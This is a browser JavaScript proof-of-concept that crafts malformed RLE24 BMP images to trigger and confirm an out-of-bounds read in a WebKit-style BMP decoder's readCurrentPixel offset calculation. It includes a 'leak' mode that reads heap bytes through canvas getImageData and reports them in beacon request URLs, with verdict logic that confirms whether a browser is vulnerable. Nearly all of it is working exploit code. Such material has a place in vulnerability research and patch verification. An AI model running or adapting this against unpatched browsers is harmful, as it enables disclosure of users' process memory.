// p403-rle24leak.js — V403 RLE24 readCurrentPixel OOB probe
// Tests BMPImageReader readCurrentPixel() offset miscalculation
// Bug: absolute m_coord.x() * bytesPerPixel instead of relative (m_coord.x() - startX) * bytesPerPixel
// Only reachable via RLE24 (OS/2 2.x, biCompression=4, biBitCount=24) DELTA + absolute mode
// WK-1400 fixed this by moving readCurrentPixel to a lambda capturing startX

(function() {
  'use strict';

  var qc = 0;
  function B(m) {
    new Image().src = '/beacon/V403-' + encodeURIComponent(m) + '?t=' + Date.now() + '&q=' + (qc++);
  }

  B('INIT');

  // ---- BMP Construction ----

  // Write a little-endian uint16 into a Uint8Array at offset
  function writeU16(arr, off, val) {
    arr[off]     = val & 0xFF;
    arr[off + 1] = (val >> 8) & 0xFF;
  }

  // Write a little-endian uint32 into a Uint8Array at offset
  function writeU32(arr, off, val) {
    arr[off]     = val & 0xFF;
    arr[off + 1] = (val >> 8) & 0xFF;
    arr[off + 2] = (val >> 16) & 0xFF;
    arr[off + 3] = (val >> 24) & 0xFF;
  }

  // Build an RLE24 BMP file
  // width x height image, bottom-up
  // Row 0 (y=height-1): solid green fill
  // Row 1 (y=height-2): DELTA(deltaX, 0) + absolute(numAbsPix) with known data
  // Row 2 (y=height-3): solid red fill
  // Row 3 (y=height-4): solid blue fill + EOF
  // If padToSize > 0, file is padded with sentinel bytes (0xCC) after EOF
  function buildRLE24BMP(width, height, deltaX, numAbsPix, padToSize) {
    // Absolute run pixel data: all 0x42 (BGR = 0x42,0x42,0x42 -> gray)
    var ABS_BYTE = 0x42;
    // Sentinel for post-EOF padding
    var SENTINEL = 0xCC;

    // Calculate RLE data
    var rleBytes = [];

    // Helper: encode a full row of solid color (R, G, B) for width pixels
    // RLE24 encoded mode: [count, Blue, Green, Red] -> 4 bytes, max count=255
    function encodeRow(r, g, b) {
      var remaining = width;
      while (remaining > 0) {
        var cnt = Math.min(remaining, 255);
        rleBytes.push(cnt, b, g, r);
        remaining -= cnt;
      }
      // EOL
      rleBytes.push(0x00, 0x00);
    }

    // Row 0 (bottom, decoded to y=height-1): solid green
    encodeRow(0x00, 0xFF, 0x00);

    // Row 1 (decoded to y=height-2): THE BUG ROW
    // DELTA(deltaX, 0)
    rleBytes.push(0x00, 0x02, deltaX, 0x00);
    // Absolute mode: [0x00, numAbsPix]
    rleBytes.push(0x00, numAbsPix);
    // Record where absolute pixel data starts in rleBytes
    var absDataStart = rleBytes.length;
    // Pixel data: numAbsPix * 3 bytes of ABS_BYTE (BGR triples)
    var absDataLen = numAbsPix * 3;
    for (var i = 0; i < absDataLen; i++) {
      rleBytes.push(ABS_BYTE);
    }
    // Pad to 16-bit boundary (even number of bytes)
    if (absDataLen % 2 !== 0) {
      rleBytes.push(0x00);
    }
    // EOL
    rleBytes.push(0x00, 0x00);

    // Row 2 (decoded to y=height-3): solid red
    encodeRow(0xFF, 0x00, 0x00);

    // Row 3 (decoded to y=height-4): solid blue + EOF
    var remaining = width;
    while (remaining > 0) {
      var cnt = Math.min(remaining, 255);
      rleBytes.push(cnt, 0xFF, 0x00, 0x00);
      remaining -= cnt;
    }
    // EOF (instead of EOL for last row)
    rleBytes.push(0x00, 0x01);

    var rleDataSize = rleBytes.length;
    var pixelDataOffset = 14 + 40; // file header + info header, no palette
    var baseFileSize = pixelDataOffset + rleDataSize;
    var fileSize = padToSize > baseFileSize ? padToSize : baseFileSize;

    var bmp = new Uint8Array(fileSize);

    // ---- BMP File Header (14 bytes) ----
    bmp[0] = 0x42; // 'B'
    bmp[1] = 0x4D; // 'M'
    writeU32(bmp, 2, fileSize);
    // reserved: 0
    writeU32(bmp, 10, pixelDataOffset);

    // ---- BITMAPINFOHEADER (40 bytes) ----
    writeU32(bmp, 14, 40);                  // biSize
    writeU32(bmp, 18, width);               // biWidth (signed, positive)
    writeU32(bmp, 22, height);              // biHeight (positive = bottom-up)
    writeU16(bmp, 26, 1);                   // biPlanes
    writeU16(bmp, 28, 24);                  // biBitCount
    writeU32(bmp, 30, 4);                   // biCompression = 4 (BI_RLE24 / OS2 2.x)
    writeU32(bmp, 34, rleDataSize);         // biSizeImage
    // biXPelsPerMeter, biYPelsPerMeter, biClrUsed, biClrImportant = 0 (already zeroed)

    // ---- RLE Data ----
    for (var i = 0; i < rleDataSize; i++) {
      bmp[pixelDataOffset + i] = rleBytes[i];
    }

    // ---- Post-EOF Sentinel Padding ----
    for (var i = baseFileSize; i < fileSize; i++) {
      bmp[i] = SENTINEL;
    }

    return {
      data: bmp,
      absDataFileOffset: pixelDataOffset + absDataStart,
      rleDataSize: rleDataSize,
      baseFileSize: baseFileSize
    };
  }

  // ---- Array to base64 ----
  function arrayToBase64(arr) {
    var binary = '';
    var len = arr.length;
    for (var i = 0; i < len; i++) {
      binary += String.fromCharCode(arr[i]);
    }
    return btoa(binary);
  }

  // ---- Test Runner ----

  var DELTAS = [0, 50, 100, 200];
  var WIDTH = 256;
  var HEIGHT = 4;
  var NUM_ABS_PIX = 16;
  var ABS_BYTE = 0x42;
  var SENTINEL = 0xCC;

  // For verify mode: pad file so OOB reads hit sentinel data within the file
  // Max OOB offset: deltaX=200 * 3 bytes/pixel + (16-1)*3 = 645 bytes from absDataStart
  // absDataStart in file ~ 70 bytes from pixel data start
  // So we need file to be at least 70 + 645 + 54(header) ~ 770 bytes
  // Use 2048 for safety
  var VERIFY_PAD_SIZE = 2048;

  var results = [];
  var testQueue = [];

  // Build test queue: verify mode for each delta, then leak mode for non-zero deltas
  for (var di = 0; di < DELTAS.length; di++) {
    testQueue.push({ deltaX: DELTAS[di], mode: 'verify' });
  }
  // Leak mode: minimal file, OOB reads go to heap
  for (var di = 0; di < DELTAS.length; di++) {
    if (DELTAS[di] > 0) {
      testQueue.push({ deltaX: DELTAS[di], mode: 'leak' });
    }
  }

  var testIndex = 0;

  function runNextTest() {
    if (testIndex >= testQueue.length) {
      finishAllTests();
      return;
    }

    var test = testQueue[testIndex];
    testIndex++;

    var deltaX = test.deltaX;
    var mode = test.mode;
    var padSize = (mode === 'verify') ? VERIFY_PAD_SIZE : 0;

    B('TEST-D' + deltaX + '-' + mode.charAt(0).toUpperCase());

    try {
      var bmpResult = buildRLE24BMP(WIDTH, HEIGHT, deltaX, NUM_ABS_PIX, padSize);
      var bmpData = bmpResult.data;
      var absFileOff = bmpResult.absDataFileOffset;

      var b64 = arrayToBase64(bmpData);
      var dataUri = 'data:image/bmp;base64,' + b64;

      var img = new Image();
      img.onload = function() {
        try {
          var canvas = document.createElement('canvas');
          canvas.width = WIDTH;
          canvas.height = HEIGHT;
          var ctx = canvas.getContext('2d');
          ctx.drawImage(img, 0, 0);

          // The DELTA row is y=2 in the canvas (file row 1, decoded to y=height-2=2)
          var bugRowY = HEIGHT - 2;
          var imageData = ctx.getImageData(0, bugRowY, WIDTH, 1);
          var pxData = imageData.data;

          // Check pixels at positions deltaX through deltaX+NUM_ABS_PIX-1
          var matchCount = 0;
          var mismatchCount = 0;
          var sentinelCount = 0;
          var oobValues = [];

          for (var pi = 0; pi < NUM_ABS_PIX; pi++) {
            var xPos = deltaX + pi;
            var r = pxData[xPos * 4];
            var g = pxData[xPos * 4 + 1];
            var b = pxData[xPos * 4 + 2];
            var a = pxData[xPos * 4 + 3];

            // Expected without bug: R=0x42, G=0x42, B=0x42, A=0xFF
            if (r === ABS_BYTE && g === ABS_BYTE && b === ABS_BYTE) {
              matchCount++;
            } else {
              mismatchCount++;
              if (r === SENTINEL && g === SENTINEL && b === SENTINEL) {
                sentinelCount++;
              }
              // Record first 8 OOB pixel values
              if (oobValues.length < 8) {
                oobValues.push(xPos + ':' + hex2(r) + hex2(g) + hex2(b) + hex2(a));
              }
            }
          }

          // Also check some pixels BEFORE the delta position (should be transparent)
          var preOk = 0;
          var preNonZero = 0;
          if (deltaX > 0) {
            for (var ci = 0; ci < Math.min(deltaX, 8); ci++) {
              var pr = pxData[ci * 4];
              var pg = pxData[ci * 4 + 1];
              var pb = pxData[ci * 4 + 2];
              var pa = pxData[ci * 4 + 3];
              if (pr === 0 && pg === 0 && pb === 0 && pa === 0) {
                preOk++;
              } else {
                preNonZero++;
              }
            }
          }

          // Also read the green row (y=height-1=3) to verify RLE24 decoding works at all
          var greenRowData = ctx.getImageData(0, HEIGHT - 1, WIDTH, 1).data;
          var greenOk = 0;
          for (var gi = 0; gi < 8; gi++) {
            if (greenRowData[gi * 4] === 0 &&
                greenRowData[gi * 4 + 1] === 255 &&
                greenRowData[gi * 4 + 2] === 0 &&
                greenRowData[gi * 4 + 3] === 255) {
              greenOk++;
            }
          }

          var tag = 'D' + deltaX + '-' + mode.charAt(0).toUpperCase();

          // Report summary
          B(tag + '-MAT' + matchCount + '-MIS' + mismatchCount + '-SEN' + sentinelCount + '-GRN' + greenOk);

          // Report pre-delta area
          if (deltaX > 0) {
            B(tag + '-PRE-OK' + preOk + '-NZ' + preNonZero);
          }

          // Report OOB values if any
          if (oobValues.length > 0) {
            // Split into chunks to avoid URL length issues
            var chunk = oobValues.slice(0, 4).join(',');
            B(tag + '-OOB1-' + chunk);
            if (oobValues.length > 4) {
              chunk = oobValues.slice(4, 8).join(',');
              B(tag + '-OOB2-' + chunk);
            }
          }

          // Store result
          results.push({
            deltaX: deltaX,
            mode: mode,
            match: matchCount,
            mismatch: mismatchCount,
            sentinel: sentinelCount,
            greenOk: greenOk,
            oob: oobValues
          });

        } catch (e) {
          B('D' + deltaX + '-' + mode.charAt(0).toUpperCase() + '-GETDATA-ERR-' + (e.message || e).substring(0, 60));
        }

        setTimeout(runNextTest, 50);
      };

      img.onerror = function() {
        B('D' + deltaX + '-' + mode.charAt(0).toUpperCase() + '-IMG-FAIL');
        results.push({
          deltaX: deltaX,
          mode: mode,
          error: 'img-load-fail'
        });
        setTimeout(runNextTest, 50);
      };

      img.src = dataUri;
    } catch (e) {
      B('D' + deltaX + '-' + mode.charAt(0).toUpperCase() + '-BUILD-ERR-' + (e.message || e).substring(0, 60));
      setTimeout(runNextTest, 50);
    }
  }

  function hex2(val) {
    var s = val.toString(16);
    return s.length < 2 ? '0' + s : s;
  }

  function finishAllTests() {
    // Summary beacon
    var verifyOOB = 0;
    var leakOOB = 0;
    var imgFails = 0;
    var greenTotal = 0;

    for (var i = 0; i < results.length; i++) {
      var r = results[i];
      if (r.error) {
        imgFails++;
      } else {
        greenTotal += r.greenOk;
        if (r.mode === 'verify' && r.mismatch > 0) verifyOOB += r.mismatch;
        if (r.mode === 'leak' && r.mismatch > 0) leakOOB += r.mismatch;
      }
    }

    // D0 verify result tells us if RLE24 basic decoding works
    var d0Result = null;
    for (var i = 0; i < results.length; i++) {
      if (results[i].deltaX === 0 && results[i].mode === 'verify') {
        d0Result = results[i];
        break;
      }
    }

    var d0Status = 'NONE';
    if (d0Result) {
      if (d0Result.error) d0Status = 'ERR';
      else if (d0Result.match === NUM_ABS_PIX && d0Result.greenOk === 8) d0Status = 'OK';
      else if (d0Result.greenOk < 8) d0Status = 'RLE24-FAIL';
      else d0Status = 'D0-MIS' + d0Result.mismatch;
    }

    B('SUMMARY-BASE' + d0Status + '-VOOB' + verifyOOB + '-LOOB' + leakOOB + '-IFAIL' + imgFails + '-GRN' + greenTotal);

    // Determine overall verdict
    if (imgFails === results.length) {
      B('VERDICT-RLE24-UNSUPPORTED');
    } else if (d0Status === 'RLE24-FAIL') {
      B('VERDICT-RLE24-DECODE-FAIL');
    } else if (verifyOOB > 0) {
      B('VERDICT-OOB-CONFIRMED');
    } else if (d0Status === 'OK' && verifyOOB === 0) {
      B('VERDICT-NO-OOB-PATCHED');
    } else {
      B('VERDICT-INCONCLUSIVE');
    }

    B('DONE');
  }

  // Start tests after a short delay for page setup
  setTimeout(function() {
    B('START-TESTS-' + testQueue.length);
    runNextTest();
  }, 200);

})();
